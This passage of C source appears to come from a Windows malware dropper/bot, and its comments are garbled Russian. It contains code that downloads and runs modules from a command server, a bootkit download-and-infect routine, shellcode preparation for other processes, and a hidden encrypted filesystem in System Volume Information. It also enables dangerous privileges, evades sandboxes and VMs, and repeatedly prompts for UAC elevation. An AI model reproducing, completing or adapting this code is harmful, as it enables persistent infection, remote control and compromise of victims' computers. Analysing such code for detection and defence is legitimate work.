                    ret = 2;
                }
                else {
                    // �. �. �� ���������� ��������� ������, �� ��������������� �������� ���������.
                    dropper_create_check_mutex();
                }
            }
        }
        zs_free(runCommand);
        service_destroy(pService);
    }

    if (!ret) {
        zs_free(targetPath);
    }
    zs_free(targetName);

    return ret;
}

/*
void dropper_deinstall_ring3()
{
    HKEY KeyHandle;
    DWORD result;
    int counter = 0;
    wchar_t lnkPath[MAX_PATH + 32];

    dropper_deinstall_registry(HKEY_CURRENT_USER);
    dropper_deinstall_registry(HKEY_LOCAL_MACHINE);

    if (ghLockFile != NULL) {
        utils_file_unlock(ghLockFile);
        ghLockFile = NULL;
    }

    if (ghLockerLockFile != NULL) {
        utils_file_unlock(ghLockerLockFile);
        ghLockerLockFile = NULL;
    }

    for ( ; !fn_DeleteFileW(pThis->modulePathName) && counter < 7; ++counter) {
        fn_Sleep(300);
    }

    for ( ; !fn_DeleteFileW(pThis->targetPathName) && counter < 7; ++counter) {
        fn_Sleep(300);
    }

    // �� ������ ������ �������� ��� �������� ����� ������.
    fn_MoveFileExW(pThis->modulePathName, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
    fn_MoveFileExW(pThis->targetPathName, 0, MOVEFILE_DELAY_UNTIL_REBOOT);

    if (fn_StrStrIW(pThis->modulePathName, L".dll") == NULL) {
        fn_PathRemoveFileSpecW(pThis->modulePathName);
        for ( ; !fn_RemoveDirectoryW(pThis->modulePathName) && counter < 7; ++counter) {
            fn_Sleep(300);
        }
    }

    fn_MoveFileExW(pThis->modulePathName, 0, MOVEFILE_DELAY_UNTIL_REBOOT);

    if (fn_SHGetSpecialFolderPathW(0, lnkPath, CSIDL_STARTUP, FALSE)) {
        fn_PathAppendW(lnkPath, LNK_FILE_BASENAME);
        for ( ; !fn_DeleteFileW(lnkPath) && counter < 7; ++counter) {
            fn_Sleep(300);
        }
    }
}

int zmodule_run(uint8_t* pModule)
{
    uint32_t* addressOfFunctions;
    uint32_t exportSize;
    FnZModuleEntry fnZModuleEntry = NULL;
    uint8_t* newBase = NULL;
    PIMAGE_EXPORT_DIRECTORY pExports;
    uint8_t* moduleBase;
    int ret = 1;
    pzmodule_header_t pZMHdr;

    do {
        //fn_MessageBoxA(NULL, "Before zmodule_load_sections", "zmodule_run", MB_OK);
        newBase = zmodule_load_sections(pModule, NULL, PAGE_EXECUTE_READWRITE);
        //fn_MessageBoxA(NULL, "After zmodule_load_sections", "zmodule_run", MB_OK);
        pZMHdr = (pzmodule_header_t)newBase;

        // ���� ������� � ������� �������� (1 �������).
        pExports = (PIMAGE_EXPORT_DIRECTORY)(newBase + pZMHdr->dataDirectory[ZMODULE_DIRECTORY_ENTRY_EXPORT].virtualAddress);
        exportSize = pZMHdr->dataDirectory[ZMODULE_DIRECTORY_ENTRY_EXPORT].size;

        // ������ ���� ������� �������� � ��������� �������� � ����� ����������  @1 � @2.
        if ((uint8_t*)pExports == newBase || exportSize == 0 || pExports->Base != 1 || pExports->NumberOfFunctions == 0) {
            break;
        }

        addressOfFunctions = (uint32_t*)(newBase +  pExports->AddressOfFunctions);

        // �������� �� ������ ���� ��������.
        if (addressOfFunctions[0] == 0) {
            break;
        }

        fnZModuleEntry = (pvoid_t)(newBase + addressOfFunctions[0]);

        //fn_MessageBoxA(NULL, "Before fnZModuleEntry", "zmodule_run", MB_OK);
        ret = fnZModuleEntry(ZMODULE_REASON_LOAD, newBase, pThis);
        //fn_MessageBoxA(NULL, "After fnZModuleEntry", "zmodule_run", MB_OK);
    } while (0);
exit:
    fn_VirtualFree(newBase, 0, MEM_RELEASE);
    return ret;
}


int dropper_execute_zmodule(const wchar_t* name)
{
    int ret = 0;
    uint8_t* pModule = NULL;
    uint8_t* pPackedModule;
    uint32_t moduleSize;
    int counter;
    servercomm_request_t serverRequest;

    servercomm_init(&serverRequest, SERVER_DOWNLOAD_FILE, L"GET", L"modules", name, NULL, NULL);

    if (name == gLockerName) {
        ret = servercomm_do_request(&serverRequest, 3, 3, 0);
        if (ret) {
            pPackedModule = serverRequest.httpClient.pResponse;
            moduleSize = serverRequest.httpClient.responseByteCountReceived;
            dropper_get_local_locker_path();
            for (counter = 0; !utils_file_write(pThis->targetPathName, CREATE_ALWAYS, pPackedModule, moduleSize) && counter < 7; ++counter) {
                fn_Sleep(3000);
            }
            dropper_load_local_locker_module();
        }
        else {
            pPackedModule = gpLockerBuffer;
            moduleSize = gLockerSize;
            if (pPackedModule == 0) {
                // �������� ������ ������� ������...
                ret = servercomm_do_request(&serverRequest, 7, 70, 0);
                pPackedModule = serverRequest.httpClient.pResponse;
                moduleSize = serverRequest.httpClient.responseByteCountReceived;
            }
        }
    }
    else {
        ret = servercomm_do_request(&serverRequest, 7, 70, 0);
        pPackedModule = serverRequest.httpClient.pResponse;
        moduleSize = serverRequest.httpClient.responseByteCountReceived;
    }

    if (pPackedModule != NULL) {
        pModule = dropper_unpack_zmodule(pPackedModule, moduleSize, &moduleSize);
        if (pPackedModule != serverRequest.httpClient.pResponse) {
            memfree(pPackedModule);
        }
        if (pModule != 0) {
            ret = zmodule_run(pModule);
            memfree(pModule);
        }
    }

    servercomm_done(&serverRequest);

    return ret;
}


*/
// 
// void dropper_prepare_shellcode(uint8_t* pDescBuffer, const uint8_t* pOrigSc, uint32_t origSize, const uint8_t* pData, uint32_t dataSize)
// {
//     uint8_t* ptr;
// 
//     *pDescBuffer = 0xE8; // call
//     *(pDescBuffer + 5) = 0xC3; // ret
//     __movsb(pDescBuffer + 5 + 1, pData, dataSize);
// 
//     ptr = pDescBuffer + 6 + dataSize;
// 
//     while ((uintptr_t)ptr % 4 != 0) {
//         *(ptr++) = 0x90;
//     }
// //     /**(ptr - 1) = 0xCC;*/    
// 
//     __movsb(ptr, pOrigSc, origSize);
// 
//     *(uint32_t*)(pDescBuffer + 1) = (uint32_t)(ptr - pDescBuffer - 5/* - 1*/);
// }
// 
// BOOLEAN dropper_prepare_shellcode_data(uint8_t* imageBase, pstd_shellcode_data pScData, const char* mappingName, const char* funcName, int needTerminate, int is64)
// {
// #ifndef _WIN64
//     if (is64) {
//         PROCESSENTRY32 processEntry;
//         HANDLE hSnap;
//         HANDLE hProcess = NULL;
//         uint64_t fnOpenFileMappingAAddr;
// 
//         __stosb((uint8_t*)&processEntry, 0, sizeof(processEntry));
// 
//         hSnap = fn_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//         if (hSnap != INVALID_HANDLE_VALUE) {
//             processEntry.dwSize = sizeof(processEntry);
//             if (fn_Process32First(hSnap, &processEntry)) {
//                 do {
//                     HANDLE hTempProcess = fn_OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, processEntry.th32ProcessID);
//                     if (hTempProcess != NULL && !utils_is_wow64(hTempProcess)) {
//                         fnOpenFileMappingAAddr = GetRemoteProcAddress64(hTempProcess, L"kernel32.dll", "OpenFileMappingA");
//                         if (fnOpenFileMappingAAddr != 0) {
//                             hProcess = hTempProcess;
//                             break;
//                         }
//                     }
// 
//                     if (hTempProcess != NULL) {
//                         fn_CloseHandle(hTempProcess);
//                     }
//                 } while (fn_Process32Next(hSnap, &processEntry));
//             }
//             fn_CloseHandle(hSnap);
//         }
// 
//         if (hProcess == NULL) {
//             return FALSE;
//         }
// 
//         pScData->fnOpenFileMappingA.addr64 = GetRemoteProcAddress64(hProcess, L"kernel32.dll", "OpenFileMappingAAddr");
//         pScData->fnMapViewOfFile.addr64 = GetRemoteProcAddress64(hProcess, L"kernel32.dll", "MapViewOfFile");
//         pScData->fnUnmapViewOfFile.addr64 = GetRemoteProcAddress64(hProcess, L"kernel32.dll", "UnmapViewOfFile");
//         pScData->fnCloseHandle.addr64 = GetRemoteProcAddress64(hProcess, L"kernel32.dll", "fn_CloseHandle");
//         pScData->fnCreateThread.addr64 = GetRemoteProcAddress64(hProcess, L"kernel32.dll", "CreateThread");
//         pScData->fnTerminateProcess.addr64 = GetRemoteProcAddress64(hProcess, L"kernel32.dll", "TerminateProcess");
//     }
//     else {
// #endif // _WIN64
// #ifdef _WIN64
//         pScData->fnOpenFileMappingA.addr64 = (uint64_t)fn_OpenFileMappingA;
//         pScData->fnMapViewOfFile.addr64 = (uint64_t)fn_MapViewOfFile;
//         pScData->fnUnmapViewOfFile.addr64 = (uint64_t)fn_UnmapViewOfFile;
//         pScData->fnCloseHandle.addr64 = (uint64_t)fn_CloseHandle;
//         pScData->fnCreateThread.addr64 = (uint64_t)fn_CreateThread;
//         pScData->fnTerminateProcess.addr64 = (uint64_t)fn_TerminateProcess;
// #else
//         pScData->fnOpenFileMappingA.addr32 = (uint32_t)fn_OpenFileMappingA;
//         pScData->fnMapViewOfFile.addr32 = (uint32_t)fn_MapViewOfFile;
//         pScData->fnUnmapViewOfFile.addr32 = (uint32_t)fn_UnmapViewOfFile;
//         pScData->fnCloseHandle.addr32 = (uint32_t)fn_CloseHandle;
//         pScData->fnCreateThread.addr32 = (uint32_t)fn_CreateThread;
//         pScData->fnTerminateProcess.addr32 = (uint32_t)fn_TerminateProcess;
// #endif // _WIN64
// #ifndef _WIN64
//     }
// #endif // _WIN64
// 
//     fn_lstrcpynA(pScData->mappingName, mappingName, RTL_NUMBER_OF(pScData->mappingName));
//     pScData->needTerminate = needTerminate;
//     pScData->injectEntryRva = (uint32_t)PeGetProcAddress(imageBase, funcName, TRUE);
//     __movsb((uint8_t*)&pScData->pi, (uint8_t*)&payloadInfo, sizeof(payload_info_t));
//     pScData->piEntryRva = (uint32_t)PeGetProcAddress(imageBase, "gpi", TRUE);
// 
//     return TRUE;
// }
/*
void dropper_free_shared_memory()
{
    if (gPayload != NULL) {
        fn_UnmapViewOfFile(gPayload);
        gPayload = NULL;
    }

    if (ghPayloadMapping != NULL) {
        fn_CloseHandle(ghPayloadMapping);
        ghPayloadMapping = NULL;
    }

    if (gpModuleBuffer != NULL) {
        memfree(gpModuleBuffer);
    }
}
*/
#ifdef USE_BOOTKIT

int dropper_download_zerokit()
{
    int counter = 0;
    uint8_t* pPack;
    DWORD packSize;
    uint8_t* pPayload;
    uint32_t payloadSize;
    int err = ERROR_NONE;
    pzerokit_header_t pZerokitHdr;
    mods_pack_header_t* packHdr;
    uint32_t crc[2];
    int i;

    do {
        pPack = memalloc(1024 * 1024);

        for ( ; !dropper_request_to_server(L"GET", gZerokitName, pPack, &packSize) && counter < 4; ++counter) {
            fn_Sleep(70000);
        }

        if (counter >= 4) {
            memfree(pPack);
            err = ERROR_BK_UNKNOWN;
            break;
        }

        // �������������� ������.
        pPayload = NULL;
        crc64_buildtable();

        err = utils_lzma_decompress(pPack, packSize, (pvoid_t*)&pPayload, &payloadSize);

        if (err != ERROR_NONE) {
            DbgMsg("Cannot decompress payload (%d)", err);
            err = ERROR_UNKNOWN;
            break;
        }

        memfree(pPack);

        payloadInfo.payloadSize = payloadSize + sizeof(exploit_startup_header_t);
        payloadInfo.payloadName[7] = '\0';
        for (i = 0; i < 7; ++i) {
            payloadInfo.payloadName[i] = cb64[fn_RtlRandomEx(&seed) % 62];
        }

        pThis->ghPayloadMapping = fn_CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, payloadInfo.payloadSize, payloadInfo.payloadName);

        if (pThis->ghPayloadMapping == NULL) {
            err = ERROR_NO_MEMORY;
            DbgMsg("CreateFileMappingA failed", fn_GetLastError());
            break;
        }

        pThis->gPayload = fn_MapViewOfFile(pThis->ghPayloadMapping, FILE_MAP_WRITE, 0, 0, payloadInfo.payloadSize);

        if (pThis->gPayload == NULL) {
            err = ERROR_NO_MEMORY;
            DbgMsg("MapViewOfFile failed", fn_GetLastError());
            break;
        }

        __movsb(pThis->gPayload + sizeof(exploit_startup_header_t), pPayload, payloadSize);
        pZerokitHdr = (pzerokit_header_t)(pThis->gPayload + sizeof(exploit_startup_header_t) + 1024 + 2);
        pZerokitHdr->affid = BUILD_ID;
        pZerokitHdr->subid = SUB_ID;

        packHdr = (pmods_pack_header_t)(pThis->gPayload + sizeof(exploit_startup_header_t) + pZerokitHdr->sizeOfBootkit);
        crc64_computate((PUCHAR)packHdr + sizeof(mods_pack_header_t), (size_t)packHdr->sizeOfPack, crc);

        if (fn_RtlCompareMemory(crc, &packHdr->crc, 8) != 8) {
            err = ERROR_PAYLOAD_CRC;
            DbgMsg("Incorrect CRC in 32-bit pack");
            break;
        }

        packHdr = (mods_pack_header_t*)((PUCHAR)packHdr + sizeof(mods_pack_header_t) + packHdr->sizeOfPack);
        crc64_computate((PUCHAR)packHdr + sizeof(mods_pack_header_t), (size_t)packHdr->sizeOfPack, crc);

        if (fn_RtlCompareMemory(crc, &packHdr->crc, 8) != 8) {
            err = ERROR_PAYLOAD_CRC;
            DbgMsg("Incorrect CRC in 64-bit pack");
            break;
        }
    } while (0);

    fn_VirtualFree(pPayload, 0, MEM_RELEASE);

    return err;
}

int dropper_install_bootkit()
{
    int err = ERROR_BK_NO_SPACE;

    if ((err = bk_infect(1)) == ERROR_BK_NO_SPACE) {
        err = bk_infect(0);
        //         if (err == ERROR_BK_NO_SPACE) {
        //             DbgMsg(__FUNCTION__"(): Disk(s) is not formatted!", 0);
        //         }
        //         else if (err == ERROR_NONE) {
        //             DbgMsg(__FUNCTION__"(): Bootkit was installed at the ending of partition!", 0);
        //         }
        //         else {
        //             DbgMsg(__FUNCTION__"(): Bootkit was not installed!!", 0);
        //         }
    }

    return err;
}


#endif // USE_BOOTKIT

/*
void hijackEntry(uint8_t* imageBase)
{
    HANDLE hMem = NULL;
// 
//     if (zmodule_process_relocs(imageBase, imageBase - zmodule_get_image_base(imageBase))) {
//         //if (CreateCheckMutex(GetCurrentProcessId(), utils_machine_guid()))
//         {
//             if (functions_init(0) != ERROR_NONE) {
//                 return;
//             }
// 
//             //GetModuleFileName(NULL, pThis->modulePath, RTL_NUMBER_OF(pThis->modulePath));
//             globalData.currentImageBase = imageBase;
//             globalData.currentImageSize = PeImageNtHeader(imageBase)->OptionalHeader.SizeOfImage;
//             globalData.bFirstImageLoad = FALSE;
//             globalData.gPayload = NULL;
// 
//             do {
//                 hMem = fn_OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, payloadInfo.payloadName);
// 
//                 if (hMem == NULL) {
//                     break;
//                 }
// 
//                 globalData.gPayload = fn_MapViewOfFile(hMem, FILE_MAP_ALL_ACCESS, 0, 0, payloadInfo.payloadSize);
//                 fn_CloseHandle(hMem);
// 
//                 if (globalData.gPayload == NULL) {
//                     break;
//                 }
// #ifdef USE_BOOTKIT
//                 if (dropper_install_bootkit() == ERROR_NONE) {
//                     __movsb(globalData.gPayload, payloadInfo.payloadName, 8);
//                 }
// #endif // USE_BOOTKIT
//             } while (0);
// 
//             if (globalData.gPayload != NULL) {
//                 fn_UnmapViewOfFile(globalData.gPayload);
//             }
//         }
//     }
}

#ifdef USE_BOOTKIT
void dropper_wait_and_reboot()
{
    ULONG seed = fn_GetTickCount();
//    dropper_free_shared_memory();
    dropper_reboot_with_delay(WAITING_TIMEOUT / 3);
}
#endif // USE_BOOTKIT


HANDLE hStealerThread = NULL;
*/

int __stdcall possessor_initialize_fs()
{
    int ret = 0, fsInitialState = 0;
    uint32_t i, len;
    wchar_t* fsPath;

    // ��������� ������� �������� �������.
    // ���� ����������� �� ����� ��������� � System Volume Information ���� � ����� ���� ��� ������� ������ ����� ������.
    // ����� ���� ����� ������ ����� � ����������� ������.
    // ��� �������� ������� ����� ������������ �� MachineGUID ����������� ������ ����� ����� ����������� �������� ������������.
    {
        static char numTable[16] = { 'a', '9', 'c', '1', 'e', '4', '2', 'b', '0', '7', '6', 'd', '8', '3', 'f', '5' };
        wchar_t fsName[64];
        wchar_t* ptr = fsName;
        __stosb(fsName, 0, sizeof(fsName));
        *(ptr++) = L'{';
        len = fn_lstrlenA(_pZmoduleBlock->machineGuid);
        for (i = 0; i < len; ++i) {
            char ch = _pZmoduleBlock->machineGuid[i];
            if (ch >= 'a') {
                ch = numTable[10 + ch - 'a'];
            }
            else if (ch >= '0') {
                ch = numTable[ch - '0'];
            }
            *(ptr++) = (wchar_t)ch;
        }
        *ptr = L'}';

        if (_pZmoduleBlock->securityMask & (MANDATORY_LEVEL_UNTRUSTED | MANDATORY_LEVEL_LOW | MANDATORY_LEVEL_MEDIUM)) {
            fsPath = zs_new(_pZmoduleBlock->modulePath);
            fsPath = zs_cat(fsPath, L"\\");
        }
        else {
            fsPath = fn_zs_new_with_len(NULL, MAX_PATH);
            fn_SHGetSpecialFolderPathW(NULL, fsPath, CSIDL_SYSTEM, FALSE);
            fsPath[3] = L'\0';
            fn_lstrcpyW(fsPath, L"System Volume Information\\");
            zs_update_length(fsPath);
        }
        fsPath = zs_cat(fsPath, fsName);
    }
    do {
        _pZmoduleBlock->pZfsIo = zfs_create_io_manager();

        if (_pZmoduleBlock->pZfsIo == NULL) {
            break;
        }

        if (zfs_open_device(_pZmoduleBlock->pZfsIo, fsPath, utils_get_machine_key(), 64) != ERR_OK) {
            if (bdev_create(fsPath, FS_SIZE) != ERR_OK) {
                break;
            }
            if (zfs_open_device(_pZmoduleBlock->pZfsIo, fsPath, utils_get_machine_key(), 64) != ERR_OK) {
                break;
            }

            if (zfs_format(_pZmoduleBlock->pZfsIo) != ERR_OK) {
                break;
            }
            fsInitialState = 1;
        }

        if (zfs_mount(_pZmoduleBlock->pZfsIo) != ERR_OK) {
            zfs_close_device(_pZmoduleBlock->pZfsIo);
            break;
        }

        if (fsInitialState) {
            // ������ ����������� ����� � �����.
        }

        ret = 1;
    } while (0);



    return ret;
}

int __stdcall possessor_restart_module_shellexec(const wchar_t* filePath, const wchar_t* cmdlineParams, const wchar_t* workingPath)
{
    int ret = 0;
    int counter = 0;
    SHELLEXECUTEINFOW sei;

    __stosb((uint8_t*)&sei, 0, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.lpFile = filePath;
    sei.lpParameters = cmdlineParams;
    sei.lpDirectory = workingPath;
    sei.lpVerb = L"runas";
    sei.hwnd = fn_GetForegroundWindow();
    for (; counter++ < 7;) {
        if (fn_ShellExecuteExW(&sei)) {
            ret = 1;
            break;
        }
        LOG("ShellExecuteEx error: %08X\n", fn_GetLastError());
        fn_Sleep(3000);
    }

    return ret;
}

void possessor_common_ctrl_request_read_cb(void* data, uint32_t dataSize)
{

}

void possessor_common_cb(async_timer_t* handle)
{
    if (_pZmoduleBlock->utcStartTime == 0) {
        // �������� ��������� ����� � UTC+0, �� ������ ���� �� ������ � SNTP.
        _pZmoduleBlock->utcStartTime = utils_unixtime(1);

        // �������� GMT+0 ����� ����� SNTP-������ � �������� ������� ��� ��������.
        net_get_ntp_time(&_pZmoduleBlock->utcStartTime);
    }
    else {
        if (_pZmoduleBlock->utcLastTime == 0) {
            _pZmoduleBlock->utcLastTime = _pZmoduleBlock->utcStartTime;
            fn_QueryPerformanceCounter(&_pZmoduleBlock->lastFreqStamp);
        }

        if (_pZmoduleBlock->moduleFlags & MODULE_CONTROLLER) {
            // ���������� �������������� � ����� ����� ��������� �� �������� ������.
            ctrl_init_network_pipe();
        }

        if (async_timer_get_repeat(handle) == 1000ULL) {            
            // ����� ������� ���� ��������� 9 ����� � �������� ��������� ������������ �������.
            async_timer_set_repeat(handle, CONTROLLER_COMMON_REQUEST_TIMEOUT * 60 * 1000);
            async_timer_again(handle);
        }

        // ������ ����������� ������ �� ������ ��� ��������� ����� ������ (���������� � ����, ����������, ����� ������ � �. �.).
        {
            LPSTREAM pStream = ctrl_init_stream(REQUEST_COMMON);
            if (pStream != NULL) {
                uint32_t strSize;
                char* bundlesJson;
                stream_write_dword(pStream, _pZmoduleBlock->sysInfo.osValue);
                stream_write_dword(pStream, _pZmoduleBlock->sysInfo.osLangId);
                stream_write_dword(pStream, _pZmoduleBlock->securityMask);
                stream_write_qword(pStream, _pZmoduleBlock->hipsMask);

                stream_write_dword(pStream, 1 /*+ modules count*/);
                stream_write_dword(pStream, POSSESSOR_HASH);
                stream_write_dword(pStream, POSSESSOR_VERSION);
                stream_write_dword(pStream, 1);

                ctrl_do_request(pStream, possessor_common_ctrl_request_read_cb);
            }
        }        
    }
}

DWORD possessor_common_thread(PVOID param)
{
	HANDLE hDllHandle = _pZmoduleBlock->hDllHandle;
//    int bFiredWithExploit = 0;
//    BOOLEAN bResult = FALSE;
//    int counter, ;
	DWORD ret = 1;
//	BOOL status;
	NTSTATUS ntStatus;
//    HANDLE hUpdateThread = NULL;
	UNICODE_STRING currentUserPrefix = RTL_CONSTANT_STRING(L"\\Registry\\User\\");
	HANDLE tokenHandle;
	PTOKEN_USER tokenUser;
	UNICODE_STRING stringSid;
	wchar_t stringSidBuffer[MAX_UNICODE_STACK_BUFFER_LENGTH];
	PUNICODE_STRING currentUserKeyName;
	HANDLE hToken;
    uint32_t i, initialStart;
	int selfInstalled = 0;
	wchar_t* commandLine = NULL;
    wchar_t path[MAX_PATH];
    //wchar_t* localUserName;
    //DWORD userNameSize;
    wchar_t* targetPath = NULL;
    async_timer_t ccConnTimer;
// #ifdef _WIN64
//     __debugbreak();
// #else
//     __asm int 3
// #endif
    char* machineGuid;
    char* machineId;
    async_loop_t* pCommonLoop;

	do {
		_pZmoduleBlock->hCommonThread = _hCommonThread;

		LOG("Common thread started");
		if (!_pZmoduleBlock->allFuncsLoaded && !dynfuncs_load(0)) {
            LOG("API Functions load failed with 0x%08X", fn_GetLastError());
            break;
		}

		if (fn_OleInitialize(NULL) != S_OK) {
            LOG("OleInitialize failed with 0x%08X", fn_GetLastError());
			break;
		}

		if (_pZmoduleBlock->sysInfo.osMajorVer >= 6) {
			_pZmoduleBlock->processQueryAccess = PROCESS_QUERY_LIMITED_INFORMATION;
			_pZmoduleBlock->processAllAccess = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1fff;
			_pZmoduleBlock->threadQueryAccess = THREAD_QUERY_LIMITED_INFORMATION;
			_pZmoduleBlock->threadSetAccess = THREAD_SET_LIMITED_INFORMATION;
			_pZmoduleBlock->threadAllAccess = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xfff;
		}
		else {
			_pZmoduleBlock->processQueryAccess = PROCESS_QUERY_INFORMATION;
			_pZmoduleBlock->processAllAccess = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xfff;
			_pZmoduleBlock->threadQueryAccess = THREAD_QUERY_INFORMATION;
			_pZmoduleBlock->threadSetAccess = THREAD_SET_INFORMATION;
			_pZmoduleBlock->threadAllAccess = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3ff;
		}

		_pZmoduleBlock->systemRoot = zs_new(USER_SHARED_DATA->NtSystemRoot);

		if (zs_lastchar(_pZmoduleBlock->systemRoot) == L'\\') {
			zs_grow(_pZmoduleBlock->systemRoot, -1);
		}

        _pZmoduleBlock->slashString[0] = L'\\';
        fn_RtlInitUnicodeString(&_pZmoduleBlock->predefineKeyNames[0], L"\\Registry\\Machine");
        fn_RtlInitUnicodeString(&_pZmoduleBlock->predefineKeyNames[1], L"\\Registry\\User");
        fn_RtlInitUnicodeString(&_pZmoduleBlock->predefineKeyNames[2], L"\\Registry\\Machine\\Software\\Classes");

        // Get the string SID of the current user.
        if (NT_SUCCESS(ntStatus = fn_NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &tokenHandle))) {
            if (NT_SUCCESS(ntStatus = native_query_token_variable_size(tokenHandle, TokenUser, &tokenUser))) {
                stringSid.Buffer = stringSidBuffer;
                stringSid.MaximumLength = sizeof(stringSidBuffer);

                ntStatus = fn_RtlConvertSidToUnicodeString(&stringSid, tokenUser->User.Sid, FALSE);
                memory_free(tokenUser);
            }
            fn_NtClose(tokenHandle);
        }

        if (!fn_QueryPerformanceFrequency(&_pZmoduleBlock->perfFreq)) {
            _pZmoduleBlock->perfFreq.QuadPart = 10000000I64;
        }

        // �������� ��������� ������ ��� �������� ��������, ����� ������ ����������� �� �� �� ��� rundll32.exe
        if (NT_SUCCESS(native_get_process_command_line(NtCurrentProcess(), &commandLine))) {
            LOG("Command line: %S", commandLine);
            if (fn_StrStrIW(commandLine, L"rundll32.exe") != NULL) {
                wchar_t* ptr = commandLine + zs_length(commandLine);
                for (; ptr > commandLine && utils_isspace(*ptr); --ptr){
                    *ptr = L'\0';
                }
                for (; ptr > commandLine && *ptr != L','; --ptr);
                if (*ptr == L',') {
                    wchar_t* name = ++ptr;
                    _pZmoduleBlock->rundll32ExportName = zs_new(name);
                }
            }
        }
        // ��������� ��������� zmodule_block_t
        machineGuid = utils_machine_guid();
        machineId = _pZmoduleBlock->botId;
        fn_lstrcpyA(machineId, machineGuid);

        for (i = 0; i < 64; ++i) {
            if (machineId[i] == '{') {
                machineId[i] = '7';
            }
            else if (machineId[i] == '}') {
                machineId[i] = '9';
            }
            else if (machineId[i] == '-') {
                machineId[i] = '6';
            }
        }

        initialStart = fn_lstrlenA(machineId);
        for (i = initialStart; i < 64; ++i) {
            machineId[i] = machineId[i - initialStart];
        }

        LOG("BotId = %.64s, BuildId = %u, SubId = %u", _pZmoduleBlock->botId, BUILD_ID, SUB_ID);
        _pZmoduleBlock->buildId = BUILD_ID;
        _pZmoduleBlock->subId = SUB_ID;

		// ��������� ������� ���� ������� � ������� ����������.
		if (NT_SUCCESS(fn_NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))) {
			// �������� ������ ����������.
			static const char* privs[] = {
				"SeImpersonatePrivilege",
				"SeTcbPrivilege",
				"SeChangeNotifyPrivilege",
				"SeCreateTokenPrivilege",
				"SeBackupPrivilege",
				"SeRestorePrivilege",
				"SeIncreaseQuotaPrivilege",
				"SeAssignPrimaryTokenPrivilege",
				NULL
			};

			for (i = 0; privs[i] != NULL; ++i) {
				ntStatus = privelege_enable(hToken, privs[i]);
				LOG("Enable privilege %s done with error 0x%08X", privs[i], ntStatus);
			}

			_pZmoduleBlock->securityMask = privelege_get_security_mask(hToken);

			fn_NtClose(hToken);
		}

		// Construct the current user key name.
		if (NT_SUCCESS(ntStatus)) {
			currentUserKeyName = &_pZmoduleBlock->predefineKeyNames[NATIVE_KEY_CURRENT_USER_NUMBER];
			currentUserKeyName->Length = currentUserPrefix.Length + stringSid.Length;
			currentUserKeyName->Buffer = (PWSTR)memory_alloc(currentUserKeyName->Length + sizeof(wchar_t));
			__movsb((uint8_t*)currentUserKeyName->Buffer, (const uint8_t*)currentUserPrefix.Buffer, currentUserPrefix.Length);
			__movsb((uint8_t*)&currentUserKeyName->Buffer[currentUserPrefix.Length / sizeof(wchar_t)], (const uint8_t*)stringSid.Buffer, stringSid.Length);
		}

        //localUserName = memory_alloc(MAX_PATH * sizeof(wchar_t));
        //userNameSize = MAX_PATH;
        //if (!fn_GetUserNameW(localUserName, &userNameSize)) {
        //    memory_free(localUserName);
        //    localUserName = NULL; 
        //}
        //LOG("User: %S", localUserName);
        fn_GetModuleFileNameW((_pZmoduleBlock->asService ? NULL : _pZmoduleBlock->hDllHandle), path, MAX_PATH - 1);
        dropper_update_module_path(path);

		// ��������� ������������� ����������� ��������.
		if (!dropper_create_check_mutex()) {
            LOG("Core module already running!");
			break;
		}

		// �������� ������ ���������.
		if (NT_SUCCESS(native_enum_processes(&_pZmoduleBlock->processes, SystemProcessInformation))) {
			LOG("Obtained list of processes");
		}
		else {
			LOG("Failed to obtain list of processes");
		}

		// �������� ������ �������������� ��.
		utils_update_installed_software();

		environment_check_hipses();

		//if (environment_check_debugger(pThis)) {
		//	break;
		//}

		if (environment_check_vm()) {
			//break;
		}

		if (environment_check_sandbox()) {
			break;
		}

        /*
        if (_pZmoduleBlock->securityMask & MANDATORY_LEVEL_HIGH) {
            fn_MessageBoxA(NULL, "High", "OK", MB_OK);
        }
        else if (_pZmoduleBlock->securityMask & MANDATORY_LEVEL_MEDIUM) {
            fn_MessageBoxA(NULL, "Medium", "OK", MB_OK);
        }
        else {
            fn_MessageBoxA(NULL, "Low", "OK", MB_OK);
        }
        */

        // ��������� ������� UAC. ���� ���������, �� ��������� ���� ���� � ���������.
        if (commandLine != NULL && _pZmoduleBlock->sysInfo.osMajorVer >= 6 && _pZmoduleBlock->sysInfo.osMinorVer >= 1 &&
            (_pZmoduleBlock->securityMask & (MANDATORY_LEVEL_UNTRUSTED | MANDATORY_LEVEL_LOW | MANDATORY_LEVEL_MEDIUM))) {
            HANDLE hReg;
            wchar_t* consentRegPath = zs_new(L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            ntStatus = native_open_key(&hReg, KEY_WOW64_32KEY | KEY_READ, NATIVE_KEY_LOCAL_MACHINE, consentRegPath, 0);
            if (!NT_SUCCESS(ntStatus)) {
                ntStatus = native_open_key(&hReg, KEY_WOW64_64KEY | KEY_READ, NATIVE_KEY_LOCAL_MACHINE, consentRegPath, 0);
            }
        
            zs_free(consentRegPath);
            if (NT_SUCCESS(ntStatus)) {
                wchar_t* paramName = zs_new(L"ConsentPromptBehaviorAdmin");
                PKEY_VALUE_PARTIAL_INFORMATION pValue = native_query_registry_value(hReg, paramName);
                zs_free(paramName);
                if (pValue != NULL && pValue->Type == REG_DWORD) {
                    DWORD softUAC = *(DWORD*)pValue->Data;
                    LOG("ConsentPromptBehaviorAdmin = %u", softUAC);
                    if (softUAC != 2) {
                        wchar_t* filePath = commandLine;
                        wchar_t* cmdlineParams;
                        
                        if (commandLine[0] == L'"') {
                            ++filePath;
                            for (; *filePath != L'"'; ++filePath);
                            *filePath = L'\0';
                            cmdlineParams = filePath + 1;
                            filePath = commandLine + 1;
                        }
                        else {
                            for (; !utils_isspace(*filePath); ++filePath);
                            *filePath = L'\0';
                            cmdlineParams = filePath + 1;
                            filePath = commandLine;
                        }
